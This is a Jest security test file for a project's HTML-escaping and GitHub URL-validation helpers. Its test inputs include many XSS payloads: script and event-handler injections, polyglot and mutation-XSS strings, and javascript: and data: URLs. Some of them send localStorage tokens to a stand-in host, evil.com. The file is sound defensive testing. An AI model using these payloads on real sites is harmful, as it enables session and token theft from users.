/**
 * Security tests for XSS prevention and URL validation
 */

import { describe, it, expect } from '@jest/globals';
import { escapeHtml, unescapeHtml, sanitizeImageUrl, sanitizeObject, sanitizeActivity, sanitizeRepository } from '../shared/sanitize.js';
import { isValidGitHubUrl, isValidApiUrl } from '../shared/security.js';

describe('HTML Sanitization', () => {
  describe('escapeHtml', () => {
    it('should escape HTML special characters', () => {
      expect(escapeHtml('<script>alert("xss")</script>')).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
      expect(escapeHtml('Test & <test>')).toBe('Test &amp; &lt;test&gt;');
      expect(escapeHtml("It's a 'test'")).toBe('It&#039;s a &#039;test&#039;');
    });

    it('should handle empty strings', () => {
      expect(escapeHtml('')).toBe('');
    });

    it('should handle non-string inputs', () => {
      expect(escapeHtml(null)).toBe('');
      expect(escapeHtml(undefined)).toBe('');
      expect(escapeHtml(123)).toBe('');
    });

    it('should prevent XSS in PR titles', () => {
      const maliciousTitles = [
        '<img src=x onerror=alert(1)>',
        '<script>fetch("evil.com?token="+localStorage.token)</script>',
        '"><script>alert(document.cookie)</script>'
      ];

      maliciousTitles.forEach(title => {
        const sanitized = escapeHtml(title);
        // Tags should be escaped
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('<img');
        expect(sanitized).toContain('&lt;');
        // Verify the dangerous parts are now harmless (escaped)
        if (title.includes('onerror')) {
          expect(sanitized).toContain('&lt;img');
        }
      });
    });

    it('should not modify safe text', () => {
      const safeText = 'Fix authentication bug in user login';
      expect(escapeHtml(safeText)).toBe(safeText);
    });

    it('should escape all five critical HTML entities', () => {
      const input = `& < > " '`;
      const expected = `&amp; &lt; &gt; &quot; &#039;`;
      expect(escapeHtml(input)).toBe(expected);
    });

    it('should handle multiple occurrences of same character', () => {
      expect(escapeHtml('<<<>>>')).toBe('&lt;&lt;&lt;&gt;&gt;&gt;');
      expect(escapeHtml('&&&')).toBe('&amp;&amp;&amp;');
    });

    it('should preserve order in complex strings', () => {
      const input = 'a<b&c>d"e\'f';
      const expected = 'a&lt;b&amp;c&gt;d&quot;e&#039;f';
      expect(escapeHtml(input)).toBe(expected);
    });
  });

  describe('unescapeHtml', () => {
    it('should unescape HTML entities back to original characters', () => {
      expect(unescapeHtml('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;')).toBe('<script>alert("xss")</script>');
      expect(unescapeHtml('Test &amp; &lt;test&gt;')).toBe('Test & <test>');
      expect(unescapeHtml('It&#039;s a &#039;test&#039;')).toBe("It's a 'test'");
    });

    it('should handle empty strings', () => {
      expect(unescapeHtml('')).toBe('');
    });

    it('should handle non-string inputs', () => {
      expect(unescapeHtml(null)).toBe('');
      expect(unescapeHtml(undefined)).toBe('');
      expect(unescapeHtml(123)).toBe('');
    });

    it('should be inverse of escapeHtml', () => {
      const originalStrings = [
        '<script>alert(1)</script>',
        'Test & <test>',
        "It's a 'test'",
        '& < > " \'',
        'Normal text without special chars'
      ];

      originalStrings.forEach(str => {
        const escaped = escapeHtml(str);
        const unescaped = unescapeHtml(escaped);
        expect(unescaped).toBe(str);
      });
    });

    it('should unescape all five critical HTML entities', () => {
      const input = `&amp; &lt; &gt; &quot; &#039;`;
      const expected = `& < > " '`;
      expect(unescapeHtml(input)).toBe(expected);
    });

    it('should handle multiple occurrences of same entity', () => {
      expect(unescapeHtml('&lt;&lt;&lt;&gt;&gt;&gt;')).toBe('<<<>>>');
      expect(unescapeHtml('&amp;&amp;&amp;')).toBe('&&&');
    });

    it('should not modify strings without entities', () => {
      const safeText = 'This is normal text';
      expect(unescapeHtml(safeText)).toBe(safeText);
    });

    it('should handle partial entities correctly', () => {
      // Entities must be complete to be unescaped
      expect(unescapeHtml('&lt test &gt')).toBe('&lt test &gt');
    });
  });

  describe('sanitizeImageUrl', () => {
    it('should allow valid GitHub avatar URLs', () => {
      const validUrls = [
        'https://avatars.githubusercontent.com/u/123456',
        'https://github.com/avatar.png',
        'https://raw.githubusercontent.com/user/repo/main/image.png'
      ];

      validUrls.forEach(url => {
        expect(sanitizeImageUrl(url)).toBe(url);
      });
    });

    it('should reject non-HTTPS URLs', () => {
      expect(sanitizeImageUrl('http://avatars.githubusercontent.com/u/123456')).toBe('');
      expect(sanitizeImageUrl('ftp://github.com/avatar.png')).toBe('');
    });

    it('should reject URLs from non-GitHub domains', () => {
      expect(sanitizeImageUrl('https://evil.com/malicious.png')).toBe('');
      expect(sanitizeImageUrl('https://github.evil.com/avatar.png')).toBe('');
    });

    it('should reject javascript: URLs', () => {
      expect(sanitizeImageUrl('javascript:alert(1)')).toBe('');
    });

    it('should handle invalid URLs', () => {
      expect(sanitizeImageUrl('not a url')).toBe('');
      expect(sanitizeImageUrl(null)).toBe('');
      expect(sanitizeImageUrl(undefined)).toBe('');
    });

    it('should reject empty strings', () => {
      expect(sanitizeImageUrl('')).toBe('');
    });

    it('should handle URLs with query parameters', () => {
      const url = 'https://avatars.githubusercontent.com/u/123456?v=4';
      expect(sanitizeImageUrl(url)).toBe(url);
    });

    it('should handle URLs with fragments', () => {
      const url = 'https://github.com/avatar.png#section';
      expect(sanitizeImageUrl(url)).toBe(url);
    });

    it('should reject file:// protocol', () => {
      expect(sanitizeImageUrl('file:///etc/passwd')).toBe('');
    });

    it('should reject blob: URLs', () => {
      expect(sanitizeImageUrl('blob:https://github.com/123')).toBe('');
    });

    it('should handle custom allowed domains', () => {
      const customUrl = 'https://custom.cdn.com/image.png';
      expect(sanitizeImageUrl(customUrl, ['custom.cdn.com'])).toBe(customUrl);
      expect(sanitizeImageUrl(customUrl)).toBe(''); // Not in default list
    });

    it('should handle subdomain matching', () => {
      const subdomainUrl = 'https://cdn.githubusercontent.com/image.png';
      expect(sanitizeImageUrl(subdomainUrl)).toBe(subdomainUrl);
    });

    it('should reject domain lookalikes', () => {
      // githubusercontent.com is actually a valid GitHub domain, should be allowed
      expect(sanitizeImageUrl('https://githubusercontent.com/image.png')).toBe('https://githubusercontent.com/image.png');
      // But domains that just contain 'github' should be rejected
      expect(sanitizeImageUrl('https://xgithub.com/avatar.png')).toBe('');
      expect(sanitizeImageUrl('https://github-evil.com/avatar.png')).toBe('');
    });

    it('should handle case sensitivity in protocol', () => {
      // URL constructor normalizes protocols to lowercase
      expect(sanitizeImageUrl('HTTPS://github.com/avatar.png')).toBe('https://github.com/avatar.png');
    });

    it('should handle default ports correctly', () => {
      // URL constructor normalizes default ports (443 for HTTPS) out of the URL
      expect(sanitizeImageUrl('https://github.com:443/avatar.png')).toBe('https://github.com/avatar.png');

      // Non-default ports are preserved
      const customPortUrl = 'https://github.com:8443/avatar.png';
      expect(sanitizeImageUrl(customPortUrl)).toBe(customPortUrl);
    });
  });

  describe('sanitizeObject', () => {
    it('should sanitize specified fields in an object', () => {
      const obj = {
        title: '<script>alert(1)</script>',
        description: 'Safe description',
        author: '<img src=x onerror=alert(1)>'
      };

      const sanitized = sanitizeObject(obj, ['title', 'author']);

      expect(sanitized.title).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
      expect(sanitized.author).toBe('&lt;img src=x onerror=alert(1)&gt;');
      expect(sanitized.description).toBe('Safe description'); // Not in fields list
    });

    it('should create a new object without modifying original', () => {
      const original = {
        name: '<script>test</script>',
        value: 'safe'
      };

      const sanitized = sanitizeObject(original, ['name']);

      expect(original.name).toBe('<script>test</script>'); // Original unchanged
      expect(sanitized.name).toBe('&lt;script&gt;test&lt;/script&gt;');
      expect(sanitized).not.toBe(original); // Different objects
    });

    it('should handle fields that do not exist in object', () => {
      const obj = {
        existing: '<b>text</b>'
      };

      const sanitized = sanitizeObject(obj, ['existing', 'nonexistent']);

      expect(sanitized.existing).toBe('&lt;b&gt;text&lt;/b&gt;');
      expect(sanitized.nonexistent).toBeUndefined();
    });

    it('should handle empty fields array', () => {
      const obj = {
        unsafe: '<script>alert(1)</script>'
      };

      const sanitized = sanitizeObject(obj, []);

      expect(sanitized.unsafe).toBe('<script>alert(1)</script>'); // Unchanged
    });

    it('should handle empty object', () => {
      const sanitized = sanitizeObject({}, ['field1', 'field2']);

      expect(sanitized).toEqual({});
    });

    it('should sanitize all fields when provided', () => {
      const obj = {
        field1: '<a>',
        field2: '<b>',
        field3: '<c>'
      };

      const sanitized = sanitizeObject(obj, ['field1', 'field2', 'field3']);

      expect(sanitized.field1).toBe('&lt;a&gt;');
      expect(sanitized.field2).toBe('&lt;b&gt;');
      expect(sanitized.field3).toBe('&lt;c&gt;');
    });

    it('should preserve non-string values for unsanitized fields', () => {
      const obj = {
        name: '<script>',
        count: 42,
        enabled: true,
        data: { nested: 'value' }
      };

      const sanitized = sanitizeObject(obj, ['name']);

      expect(sanitized.count).toBe(42);
      expect(sanitized.enabled).toBe(true);
      expect(sanitized.data).toEqual({ nested: 'value' });
    });
  });

  describe('sanitizeActivity', () => {
    it('should sanitize all activity fields', () => {
      const activity = {
        id: '123',
        title: '<script>alert(1)</script>Fix bug',
        author: 'evil<script>user',
        repo: 'owner/repo<img src=x>',
        authorAvatar: 'https://avatars.githubusercontent.com/u/123',
        url: 'https://github.com/owner/repo/pull/1'
      };

      const sanitized = sanitizeActivity(activity);

      expect(sanitized.title).not.toContain('<script>');
      expect(sanitized.author).not.toContain('<script>');
      expect(sanitized.repo).not.toContain('<img');
      expect(sanitized.title).toContain('&lt;script&gt;');
    });

    it('should preserve URL field without escaping', () => {
      const activity = {
        title: 'Test',
        author: 'user',
        repo: 'owner/repo',
        authorAvatar: 'https://avatars.githubusercontent.com/u/123',
        url: 'https://github.com/owner/repo/pull/1'
      };

      const sanitized = sanitizeActivity(activity);

      // URL should be preserved as-is for validation
      expect(sanitized.url).toBe(activity.url);
    });

    it('should sanitize invalid avatar URLs', () => {
      const activity = {
        title: 'Test',
        author: 'user',
        repo: 'owner/repo',
        authorAvatar: 'http://evil.com/avatar.png',
        url: 'https://github.com/owner/repo/pull/1'
      };

      const sanitized = sanitizeActivity(activity);

      // Invalid avatar should be empty
      expect(sanitized.authorAvatar).toBe('');
    });

    it('should preserve additional fields', () => {
      const activity = {
        id: 'pr-123',
        title: 'Test',
        author: 'user',
        repo: 'owner/repo',
        type: 'pr',
        createdAt: '2025-01-10T10:00:00Z',
        authorAvatar: 'https://avatars.githubusercontent.com/u/123',
        url: 'https://github.com/owner/repo/pull/1'
      };

      const sanitized = sanitizeActivity(activity);

      expect(sanitized.id).toBe('pr-123');
      expect(sanitized.type).toBe('pr');
      expect(sanitized.createdAt).toBe('2025-01-10T10:00:00Z');
    });

    it('should handle missing optional fields', () => {
      const minimal = {
        title: '<b>Title</b>',
        author: '<i>Author</i>',
        repo: '<u>Repo</u>',
        authorAvatar: 'https://github.com/avatar.png',
        url: 'https://github.com/test'
      };

      const sanitized = sanitizeActivity(minimal);

      expect(sanitized.title).toBe('&lt;b&gt;Title&lt;/b&gt;');
      expect(sanitized.author).toBe('&lt;i&gt;Author&lt;/i&gt;');
      expect(sanitized.repo).toBe('&lt;u&gt;Repo&lt;/u&gt;');
    });
  });

  describe('sanitizeRepository', () => {
    it('should sanitize repository fields', () => {
      const repo = {
        fullName: 'owner/repo<script>',
        description: 'A test <img src=x onerror=alert(1)>',
        language: 'JavaScript<script>alert(1)</script>'
      };

      const sanitized = sanitizeRepository(repo);

      // Verify HTML tags are escaped
      expect(sanitized.fullName).not.toContain('<script>');
      expect(sanitized.fullName).toContain('&lt;script&gt;');
      expect(sanitized.description).not.toContain('<img');
      expect(sanitized.description).toContain('&lt;img');
      expect(sanitized.language).not.toContain('<script>');
    });

    it('should handle empty string fields', () => {
      const repo = {
        fullName: '',
        owner: '',
        name: '',
        description: '',
        language: ''
      };

      const sanitized = sanitizeRepository(repo);

      expect(sanitized.fullName).toBe('');
      expect(sanitized.owner).toBe('');
      expect(sanitized.name).toBe('');
      expect(sanitized.description).toBe('');
      expect(sanitized.language).toBe('');
    });

    it('should handle missing optional fields', () => {
      const repo = {
        fullName: 'owner/repo'
      };

      const sanitized = sanitizeRepository(repo);

      expect(sanitized.fullName).toBe('owner/repo');
      expect(sanitized.owner).toBe('');
      expect(sanitized.name).toBe('');
      expect(sanitized.description).toBe('');
      expect(sanitized.language).toBe('');
    });

    it('should preserve URL field without escaping', () => {
      const repo = {
        fullName: 'owner/repo',
        url: 'https://github.com/owner/repo'
      };

      const sanitized = sanitizeRepository(repo);

      expect(sanitized.url).toBe(repo.url);
    });

    it('should preserve additional fields', () => {
      const repo = {
        fullName: 'owner/repo',
        stars: 1000,
        forks: 50,
        isPrivate: false
      };

      const sanitized = sanitizeRepository(repo);

      expect(sanitized.stars).toBe(1000);
      expect(sanitized.forks).toBe(50);
      expect(sanitized.isPrivate).toBe(false);
    });
  });
});

describe('URL Validation', () => {
  describe('isValidGitHubUrl', () => {
    it('should accept valid GitHub URLs', () => {
      const validUrls = [
        'https://github.com/owner/repo',
        'https://github.com/owner/repo/pull/123',
        'https://github.com/owner/repo/issues/456',
        'https://gist.github.com/user/abc123'
      ];

      validUrls.forEach(url => {
        expect(isValidGitHubUrl(url)).toBe(true);
      });
    });

    it('should reject non-HTTPS URLs', () => {
      expect(isValidGitHubUrl('http://github.com/owner/repo')).toBe(false);
    });

    it('should reject javascript: URLs', () => {
      expect(isValidGitHubUrl('javascript:alert(1)')).toBe(false);
    });

    it('should reject data: URLs', () => {
      expect(isValidGitHubUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
    });

    it('should reject non-GitHub domains', () => {
      expect(isValidGitHubUrl('https://evil.com')).toBe(false);
      expect(isValidGitHubUrl('https://github.evil.com')).toBe(false);
    });

    it('should handle invalid URLs', () => {
      expect(isValidGitHubUrl('not a url')).toBe(false);
      expect(isValidGitHubUrl(null)).toBe(false);
      expect(isValidGitHubUrl(undefined)).toBe(false);
    });
  });

  describe('isValidApiUrl', () => {
    it('should accept valid API URLs', () => {
      expect(isValidApiUrl('https://api.github.com/repos/owner/repo')).toBe(true);
      expect(isValidApiUrl('https://registry.npmjs.org/package')).toBe(true);
    });

    it('should reject non-HTTPS URLs', () => {
      expect(isValidApiUrl('http://api.github.com/repos')).toBe(false);
    });

    it('should reject non-API domains', () => {
      expect(isValidApiUrl('https://evil.com/api')).toBe(false);
    });

    it('should support custom allowed domains', () => {
      expect(isValidApiUrl('https://custom.api.com/endpoint', ['custom.api.com'])).toBe(true);
      expect(isValidApiUrl('https://evil.com/endpoint', ['custom.api.com'])).toBe(false);
    });
  });
});

describe('XSS Attack Scenarios', () => {
  it('should prevent XSS through PR titles', () => {
    const maliciousPR = {
      title: 'Fix bug <img src=x onerror="fetch(\'https://evil.com?token=\'+localStorage.token)">',
      author: 'attacker',
      repo: 'victim/repo',
      authorAvatar: 'https://avatars.githubusercontent.com/u/123',
      url: 'https://github.com/victim/repo/pull/1'
    };

    const sanitized = sanitizeActivity(maliciousPR);
    // Verify the malicious tag is escaped and harmless
    expect(sanitized.title).toContain('&lt;img');
    expect(sanitized.title).not.toContain('<img');
    expect(sanitized.title).toContain('Fix bug');
  });

  it('should prevent XSS through usernames', () => {
    const activity = {
      title: 'Normal title',
      author: '<script>alert(document.cookie)</script>',
      repo: 'owner/repo',
      authorAvatar: 'https://avatars.githubusercontent.com/u/123',
      url: 'https://github.com/owner/repo/pull/1'
    };

    const sanitized = sanitizeActivity(activity);
    expect(sanitized.author).toContain('&lt;script&gt;');
    expect(sanitized.author).not.toContain('<script>');
  });

  it('should prevent javascript: URL injection', () => {
    expect(isValidGitHubUrl('javascript:alert(document.cookie)')).toBe(false);
    expect(isValidGitHubUrl('javascript:void(0)')).toBe(false);
    expect(isValidGitHubUrl('JAVASCRIPT:alert(1)')).toBe(false);
  });

  it('should prevent data: URL injection', () => {
    expect(isValidGitHubUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
    expect(isValidGitHubUrl('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==')).toBe(false);
  });

  it('should prevent XSS through event handlers in text', () => {
    const attacks = [
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '<body onload=alert(1)>',
      '<iframe onload=alert(1)>',
      '<input onfocus=alert(1) autofocus>'
    ];

    attacks.forEach(attack => {
      const sanitized = escapeHtml(attack);
      // Tags should be escaped, preventing execution
      expect(sanitized).not.toContain('<img');
      expect(sanitized).not.toContain('<svg');
      expect(sanitized).not.toContain('<body');
      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).not.toContain('<input');
      expect(sanitized).toContain('&lt;');
      expect(sanitized).toContain('&gt;');
      // Attribute names like "onerror" are harmless once tags are escaped
    });
  });

  it('should prevent style-based XSS', () => {
    const attacks = [
      '<style>body{background:url("javascript:alert(1)")}</style>',
      '<div style="background:url(\'javascript:alert(1)\')">',
      '<link rel="stylesheet" href="javascript:alert(1)">'
    ];

    attacks.forEach(attack => {
      const sanitized = escapeHtml(attack);
      expect(sanitized).toContain('&lt;');
      expect(sanitized).not.toContain('<style>');
      expect(sanitized).not.toContain('<link');
    });
  });

  it('should prevent encoded script injection', () => {
    const attacks = [
      '&#60;script&#62;alert(1)&#60;/script&#62;',
      '&lt;script&gt;alert(1)&lt;/script&gt;',
      '%3Cscript%3Ealert(1)%3C/script%3E'
    ];

    attacks.forEach(attack => {
      const sanitized = escapeHtml(attack);
      // Should double-escape already-escaped entities
      expect(sanitized).not.toContain('<script>');
    });
  });

  it('should prevent HTML injection via attributes', () => {
    const activity = {
      title: '" onload="alert(1)',
      author: '" autofocus onfocus="alert(1)',
      repo: 'test/repo',
      authorAvatar: 'https://github.com/avatar.png',
      url: 'https://github.com/test/repo'
    };

    const sanitized = sanitizeActivity(activity);

    expect(sanitized.title).toContain('&quot;');
    expect(sanitized.author).toContain('&quot;');
    expect(sanitized.title).not.toContain('"');
  });

  it('should handle null byte injection attempts', () => {
    const nullByteAttack = 'normal\x00<script>alert(1)</script>';
    const sanitized = escapeHtml(nullByteAttack);

    expect(sanitized).not.toContain('<script>');
    expect(sanitized).toContain('&lt;script&gt;');
  });

  it('should handle Unicode homograph attacks in URLs', () => {
    // Using lookalike characters
    const homographAttacks = [
      'https://gitһub.com/repo',  // Cyrillic 'һ' instead of 'h'
      'https://github.сom/repo'    // Cyrillic 'с' instead of 'c'
    ];

    homographAttacks.forEach(attack => {
      expect(isValidGitHubUrl(attack)).toBe(false);
    });
  });

  it('should prevent template literal injection', () => {
    const activity = {
      title: '${alert(1)}',
      author: '`${fetch("evil.com")}`',
      repo: 'test/repo',
      authorAvatar: 'https://github.com/avatar.png',
      url: 'https://github.com/test/repo'
    };

    const sanitized = sanitizeActivity(activity);

    // Template literals should be escaped
    expect(sanitized.title).toBe('${alert(1)}');
    expect(sanitized.author).toBe('`${fetch(&quot;evil.com&quot;)}`');
  });

  it('should handle deeply nested XSS attempts', () => {
    const nested = '<div><div><div><script>alert(1)</script></div></div></div>';
    const sanitized = escapeHtml(nested);

    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('<div>');
    expect(sanitized).toContain('&lt;div&gt;');
    expect(sanitized).toContain('&lt;script&gt;');
  });

  it('should prevent polyglot XSS payloads', () => {
    const polyglot = 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>';
    const sanitized = escapeHtml(polyglot);

    // All tags should be escaped
    expect(sanitized).not.toContain('</script>');
    expect(sanitized).not.toContain('<svg');
    expect(sanitized).toContain('&lt;/script&gt;');
    expect(sanitized).toContain('&lt;');
    expect(sanitized).toContain('&gt;');
    // Quotes should be escaped
    expect(sanitized).toContain('&#039;');
    expect(sanitized).toContain('&quot;');
  });

  it('should handle CRLF injection attempts', () => {
    const crlfAttack = 'normal\r\n<script>alert(1)</script>';
    const sanitized = escapeHtml(crlfAttack);

    expect(sanitized).not.toContain('<script>');
    expect(sanitized).toContain('&lt;script&gt;');
  });

  it('should prevent mutation XSS (mXSS)', () => {
    const mxssPayloads = [
      '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
      '<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=x>">'
    ];

    mxssPayloads.forEach(payload => {
      const sanitized = escapeHtml(payload);
      // All tags should be escaped
      expect(sanitized).not.toContain('<img');
      expect(sanitized).not.toContain('<noscript>');
      expect(sanitized).not.toContain('<form>');
      expect(sanitized).not.toContain('<svg>');
      expect(sanitized).toContain('&lt;');
      expect(sanitized).toContain('&gt;');
      // Once tags are escaped, attribute names are harmless
    });
  });
});
